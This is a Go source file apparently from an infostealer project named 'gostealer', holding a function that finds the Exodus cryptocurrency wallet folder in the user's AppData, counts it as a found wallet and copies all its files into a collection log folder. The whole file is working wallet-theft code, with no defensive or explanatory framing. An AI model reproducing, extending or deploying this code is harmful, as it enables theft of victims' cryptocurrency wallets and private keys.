package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyExodus(logFolderPath string) {
	exodus := path.Join(os.Getenv("appdata"), "Exodus")

	if _, err := os.Stat(exodus); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "exodus\n"
	}
	//________________

	utils.CopyFolderFiles(exodus, path.Join(logFolderPath, "wallets", "Exodus"))
}
